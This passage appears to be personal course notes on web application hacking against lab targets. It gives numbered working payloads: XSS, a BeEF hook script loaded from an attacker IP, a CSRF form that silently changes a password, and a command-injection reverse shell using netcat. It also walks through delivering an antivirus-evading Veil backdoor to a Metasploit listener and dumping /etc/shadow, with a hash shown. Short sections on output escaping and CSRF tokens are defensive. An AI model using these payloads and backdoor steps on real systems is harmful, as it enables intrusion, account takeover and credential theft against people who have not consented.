+-> Code will be executed only when the target user runs a specific URL crafted or written by hacker 
+-> So hacker will be manipulating some sort of URL and send it to a target 
+-> When user runs that url, the xss code will be executed. 
+ 
+3) DOM based XSS 
+-> Results from javascript code written on the client 
+-> Code will be interpreted and run on client side  without having any communication with web server 
+-> DOM based XSS could be dangerous, because sometimes webservers apply some sort of security and filtration to check for XSS . But with DOm based - code never gets sent to the webserver. 
+-> Hence the code will be interpreted and run on the webserver without even interacting with the webserver 
+-> These will be present into websites that update their content without refresh. 
+
+
+54) Discovering XSS:
+a) Similar to SQL injection, browse through your target and try to inject any  javascript code into the pages: text box 
+b) Test text boxes and url parameters on the form :
+-> url with parameters 
+
+http://target.com/page.php?something=something 
+
+
+
+55) Discovering advanced reflected XSS:
+-> Now if the security level is medium, lets see how we can inject our code and run javascript on the target website 
+
+
+56) Stored XSS vulnerability:
+a) Persistent and stored on page or DB
+b) The injected code is executed everytime the page is loaded 
+
+
+Exploit: 12 
+<SCRIpT>alert(String.fromCharCde(108,97,108,97))</ScRIPT> 
+
+
+57) XSS vulnerabilities - Exploitation - BEEF FRAMEWORK:
+
+a) Run any javascript code 
+b) Targets can be hooked to beef using javascript code 
+c) Browser exploitation framework allowing us to launch a number of attacks on a hooked target 
+
+-> Inject Beef hook in vulnerable pages 
+-> Execute commands from beef 
+
+
+d) What does BEEF framework do
+-> It helps us to run a large number of commands to hooked browsers 
+-> To hook a browser to beef , javascript code has to be executed on that browser
+-> As beef uses javascript, it is very easy for us to inject that code into xss vulnerable web pages and that code will be executed everytime a person runs that page
+
+e) Once beef is installed in kali linux machine, we can access it in browser: 
+http://127.0.0.1:3000/ui/panel  
+
+username/pwd: beef/beef 
+
+-> In beef page, we can see the "Online Browsers" section, which lists all the browsers that are hooked to beef 
+
+f) Exploit to hook the browser:
+
+Exploit: 13
+<script src="http://10.14.20.208:300/hook.js"></script> 
+
+
+as url:
+
+http://10.20.14.212/dvwa/vulnerabilities/xss r/?name=<script src="http://10.14.20.208:300/hook.js"></script> 
+
+-> here 10.14.20.208 is the ip of kali machine where we have installed BEEF 
+
+-> After the user clicks that url, that browser gets hooked to beef and listed in online browsers list 
+
+g) We can use url shortening service to make it look less suspicious
+
+
+58) APart from sharing URL, we can hook browsers using stored XSS vulnerability also 
+
+59) Interacting with hooked targets 
+a) Ipec 
+In Hooked Browsers -> Online Browsers -> IPEC 
+-> We can see Beef terminal where we can use beef commands and interact with beef through it 
+
+
+b) Network : will give an overview 
+
+
+59) Running Basic Commands on Victims using BEEF 
+a) We can execute commands on victims machine : 
+ Browsers -> Online Browsers -> Commands 
+
+List of plugins :  
+Spyder Eye : desktop snapshot or camera 
+Execute Javascript 
+Redirect : redirect browser to any page you want 
+PrettyTheft - > stealing passwords using fake pages 
+
+
+60) Veil framework
+a) Veil git repo:
+https://github.com/Veil-Framework/Veil/
+
+b) What is Veil framework: 
+-> Backdoor is a file that gives us full control over the machine that it gets executed 
+-> Backdoors can be caught by Anti-virus programs 
+---> Veil is a framework for generating undetectable backdoors 
+
+
+61) Veil Overview and payloads basics:
+a) Main commands in veil :
+exit 
+info 
+list 
+update 
+use 
+
+
+b) Two main tools of veil: 
+1) Evasion 
+-> Generates undectable backdoors 
+2) Ordnance 
+-> This tool generate the payloads that is used by evasion 
+-> payload is mostly the code that contains the exploitation 
+
+c) Evasion 
+Upon loading evasion, we can use list command to list the available payloads 
+1) under Evasion, first we will use list command , which lists all the payloads 
+
+eg: 
+ go/meterpreter/rev_https.py 
+ 
+ python/meterpreter/rev_http.py 
+
+IST PART OF PAYLOAD: 
+Here python is the programming language in which we will have payload 
+
+
+IInd PART OF PAYLOAD:
+meterpreter - type of payload, type of code that is going to be executed on target computer 
+-> meterpreter is the payload designed by metasploit 
+-> meterpreter helps to run into memory and helps migrating between system processes so we can have the payload or the backdoor running from a normal process like explorer 
+
+IIrd PART OF PAYLOAD:
+rev_https.py -> it is the method that is going to be used to establish the connection 
+-> here rev stands for reverse , https is the protocol that is going to be used to establish the connection 
+-> reverse means connection comes from target computer to my own hacking computer 
+
+HOW DOES IT BYPASS ANTIVIRUS PROGRAMS:
+-> Because connection is not going to the target computer , -> it is coming back to my computer i.e connection is coming from target computer, instead of hacking computer going to target computer 
+-> it is as if a target person is just connecting to a normal website 
+-> Here we will use ports which is used by normal websites: 80 or 8080 
+
+
+62) Generating an undetectable backdoor using veil 
+
+a) First use evasion and then list payloads 
+b) Use payload: go/meterpreter/rev_https.py 
+
+
+
+63) Listening for incoming connections:
+a) backdoor we created uses a reverse payload 
+-> It does not open a port in the target computer 
+--> Instead it actually connects from target computer to our hacking computer 
+-> By doing that, target computer bypasses firewalls and it will look less suspicious 
+b) So for this to work, we need to open a port in our computer so that backdoor can connect from target computer to hacking computer on that port 
+c) While creating backdoor the port was set to 8080 
+d) So now in hacking computer, we need to open that port 
+
+e) How listening for incoming connection happens in hacking computer :
+
+root@kali:~ go/meterpreter/rev_https.port 8080 
+
+f) open metasploit in hacking machine by:
+
+root@kali:~# msfconsole 
+
+-> we will use metasploit to listen to incoming connections 
+
+msf exploit(handler) > use exploit/multi/handler 
+
+
+msf exploit(handler) > show options 
+
+
+msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_https 
+PAYLOAD -> windows/meterpreter/reverse_https 
+
+
+g) upon giving command for metasploit:
+
+msf exploit(handler) > exploit 
+[*] started HTTPS reverse handler on https://10.2014.213:8080 
+
+-> we will be listing to connections 
+
+64) Using Basic delivery method to test the Backdoor and Hack windows 10 
+a) To do basic delivery method: we will put the backdoor on our webserver ,then  download it from the target computer 
+
+b) kali machine comes with a webserver, thus we can use kali as a website 
+-> We will put our backdoor in that website and then just download it from the target windows machine . 
+
+c) website directory where we should start the website is: /var/www/html 
+-> this is the location where website files are stored 
+
+d) in /var/www/html we will create a directory evilfiles and inside we will put the backdoor which we created before 
+-> backdoor we created was made using veil's evasion 
+
+
+e) Now we can download the file from the website that kali has
+
+-> before that we need to start the website service from the command prompt of kali machine 
+
+root@kali:~# service apache2 start 
+
+f) now after service is up, if we put 10.20.14.213 in browser url, it will open the website for us 
+
+-> Now if we open : 10.20.14.213/evil-files/ 
+---> we will be able to see the payload which we have copied there 
+
+g) Now we can download that backdoor file locally in target computer 
+
+h) Now upon running that file on the target computer, if we go to kali machine hacking computer where we are listening to connections via metasploitwe can see that we have received connections from the target machine 
+
+i) Thus we got full control over the target machine from the hacking machine  
+
+
+65) Gaining full control over the target computer from Beef 
+
+
+66) Security: Fixing XSS Vulnerabilities 
+a) Minimize the usage of user input on html 
+b) Escape any untrusted input before inserting it into the page 
+-> because XSS cannot only be injected into places where things are displayed on the page, but it can also be injected into parameters of certain elements of html page 
+
+c) escaping means converting each of these characters to what they would be represented by an HTML 
+-> this can be done by using a function called htmlSpecialChars
+
+char        Result 
+&          ->&amp;
+<          ->&lt;
+>          ->&gt;
+"          ->&quot;
+'          ->&#x27;
+/          ->&#x2F;
+
+c)      
+eg:
+echo 'Hello'.htmlSpecialChars($_GET['name']); 
+-> This function will iterate over each character that you entered and it will change it to its equivalent in the html code 
+-> hence the browser will now know that it is not part of the code and it is part of what should be displayed in screen as text  
+
+
+67) Insecure Session management:
+LOGGING IN AS ADMIN WITHOUT A PASSWORD BY MANIPULATING COOKIES:
+a) This is possible when session managment is programmed in such a way that it can be easily bypassed 
+
+b) We need a plugin COOKIE MANAGER+ which helps to edit cookies 
+
+c) cookies are used to authenticate users after they login 
+
+
+68) CSRF - Cross Site Request forgery 
+-> CSRF vulnerabilities helps us to force a user to do things that they dont want to do 
+
+Eg: 
+Once you login to a website. eg: facebook you will be able to do certain things to your profile like uploading pictures, change pwd etc 
+-> CSRF occurs when the website does not validate if the user actually wants to do certain tasks 
+-> If the website does not do it, hackers will be able to program a html page and if the user clicks it or runs it, they will be forced to carry out a certain task that hacker wants to perform . Like hacker can make user to change their password without user not knowing. 
+
+
+
+a) Requests are not validated at the server side
+b) Server does not check if the user generated the request 
+c) Requests can be forged and sent to users to make them do things,they dont intend to do such as changing their password.  
+
+
+d) Sample code for CSRF:
+
+<form id=form1 action="http://10.20.14.214/dvwa/vulnerabilities/csrf/" method='GET">
+<input type="hidden" autocomplete="off" name="password_new" value="666666"><br>
+<input type="hidden" autocomplete="off" name="password_conf" value="666666"><br>
+<input value="Change" name="Change" type="hidden">
+</form> 
+<script>document.getElementById("form1").submit();</script> 
+
+-> Here form input fields are hidden
+-> Once the user double clicks the file, the file will be executed automatically without the user having to submit via button or something 
+-> Thus password will get changed in this case 
+
+
+e) Here user did not click anything, did not input any password and the page was executed from a place thats not on the same web server 
+-> It was executed from local machine , but still it submitted the information, website accepted the information and website changed password 
+
+69) Right way to prevent CSRF vulnerabilities:
+a) In actual form for change password, ask the current password 
+b) Best way to prevent CSRF: Make sure that the user is submitting data through a page  that was served to him by the web application and not by anyone else 
+
+1) Good way of doing that is by using: Dynamic synchronizing tokens like JWT tokens ,csrf-token 
+
+
+70) Introduction to Brute force and Dictionary Attacks: 
+
+
+a) Brute Force attacks:
+Cover all possible combinations 
+
+b) Dictionary attacks
+Use a wordlist, try every password in the list only 
+
+
+71) Creating a wordlist:
+-> In this lecture we will learn how to create a wordlist for Dictionary attacks 
+
+a) Crunch is a tool that can be used to create a wordlist 
+
+syntax:
+> crunch [min][max][characters] -t[pattern] -o[FileName]
+
+
+Example:
+> crunch 6 8 123abc$ -t a@@@@b -o wordlist  
+
+
+b) -p option can be used to avoid repeating characters 
+
+
+72) Guessing Login password using a wordlist attack with Hydra:
+a) HYDRA is a bruteforce tool that can be used to bruteforce almost any authentication service
+
+Syntax:
+>hydra[IP] -L [usernames] -P [passwords] [service] 
+
+
+Example:
+>hydra 10.200.14.212 -l admin -p /root/wordlist.txt http-post-form "mutillidae/?page=login.php:username=^USER^&password=^pASS^&login-php-submit-button=Login:F=Not logged In" 
+
+
+73) Discovering vulnerabilities automatically: Scanning Target website for vulnerabilities
+
+a) ZED ATTACK PROXY ZAP
+-> Automatically find vulnerabilities in web applications 
+-> Free and easy to use
+-> Can also be used for manual testing 
+
+b) How to access this tool?
+-> In kali linux -> applications -> owasp zap 
+-> It opens the OWASP Zed Attack Proxy(ZAP) tool 
+
+74) Post Exploitation 
+-> So far we have seen how to discover and exploit a large number of vulnerabilities 
+-> Also we have seen how to exploit vulnerabilities like SQL injections, file inclusion, code execution and even file upload/getting reverse shell 
+
+a) Reverse shell exploit :
+-> in ping option where we can enter ip address in UI
+
+Exploit: 14
+1.1.1.1;nc -e /bin/sh 10.2.0.11.213:8888
+
+
+b) What all can be done once we get a reverse shell access:
+
+1) check the user: whomai
+
+##
+[mahesh@GS1-MAHESWAR-LX ~]$ whoami
+mahesh
+###
+
+2) Check kernel version of computer: uname -a 
+
+####
+[mahesh@GS1-MAHESWAR-LX ~]$ uname
+Linux
+[mahesh@GS1-MAHESWAR-LX ~]$ uname -a
+Linux GS1-MAHESWAR-LX 4.4.0-19041-Microsoft #3996-Microsoft Thu Jan 18 16:36:00 PST 2024 x86_64 x86_64 x86_64 GNU/Linux
+[mahesh@GS1-MAHESWAR-LX ~]$
+####
+
+3) Check user/pwd and privileges: [mahesh@GS1-MAHESWAR-LX etc]$ cat /etc/passwd
+
+#######
+[mahesh@GS1-MAHESWAR-LX etc]$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
+systemd-coredump:x:999:996:systemd Core Dumper:/:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+tss:x:59:59:Account used for TPM access:/dev/null:/sbin/nologin
+sshd:x:74:74:Privilege-separated SSH:/usr/share/empty.sshd:/sbin/nologin
+mahesh:x:1000:1000::/home/mahesh:/bin/bash###############
+
+
+4) To get salted passwd: cat /etc/shadow 
+
+####
+[mahesh@GS1-MAHESWAR-LX etc]$ sudo cat /etc/shadow
+[sudo] password for mahesh:
+root:*:19267:0:99999:7:::
+bin:*:19267:0:99999:7:::
+daemon:*:19267:0:99999:7:::
+adm:*:19267:0:99999:7:::
+lp:*:19267:0:99999:7:::
+sync:*:19267:0:99999:7:::
+shutdown:*:19267:0:99999:7:::
+halt:*:19267:0:99999:7:::
+mail:*:19267:0:99999:7:::
+operator:*:19267:0:99999:7:::
+games:*:19267:0:99999:7:::
+ftp:*:19267:0:99999:7:::
+nobody:*:19267:0:99999:7:::
+systemd-coredump:!!:19424::::::
+dbus:!!:19424::::::
+tss:!!:19424::::::
+sshd:!!:19424::::::
+mahesh:$6$cerGwt9kwV6.8N7a$jlXm1CZOWUYHNd2WTbuJMf9vvqQdmqaTtqPSJGKjwtwt7FKJOimHQToXFtX8OnwoBwUvdp2TJoV9nFCXASnGl0:19595:0:99999:7:::
+[mahesh@GS1-MAHESWAR-LX etc]$
+####
+
+
+75) Escalating Reverse shell access to Weevely Shell 
+
+a) Weevely allows us to run a number of useful functions on the target server: if we manage to upload its shell to that server 
+
+b) In this lesson, we can see how to convert a basic shell access to a weevely shell 
+
+c) Use command to generate a weevely shell: weevely generate 123456 /root
+
+root@kali:~#weevely generate 123456 /root/ shell.txt 
+
+
+76)
+a) Weevely Basics: Acccessing other websites, Running shell commands etc 
+
+Run any shell commands directly.
+> whoami
+● Run Weevely functions
+> [function name]
+● List all Weevely functions
+> help
+● Get help about a specific function
+> [function name] -h
+
+b) Download files from target webserver 
+
+Download files to local machine.
+● Find plugin help
+> file_download -h
+● Useage
+> file_download -vector [VECTOR] [FileName] -host [HOST] [location to store file]
+
+
+c) Upload files to target webserver:
+
+Upload files to web server.
+● Find plugin help
+> file_upload -h
+● Useage
+> file_upload -vector [VECTOR] [location on local machine] [location to store file]
+
+d) Getting reverse connection from Weevely 
+
+Reverse shell connection from target to us.
+● May help us bypass security.
+● Get function help
+> backdoor_reversetcp -h
+● Useage
+> backdoor_reversetcp -vector [VECTOR] [YOUR IP] [PORT]
+
+e) Accessing database 
+
+Find and read config file.
+2. Use sql_console to drop to sql console or sql_dump to dump the whole
+database, examples:
+> sql_console -h
+> sql_dump -h
+● Useage
+> sql_dump -vector [VECTOR] -host [HOST] -lpath [location to store date] [DBName] [username] [password]
+
+
+77) 4 ways to secure websites and apps:
+
+a) Write Secure code 
+b) Review the code 
+c) Get Pentest done 
+d) Run a bug bounty program  
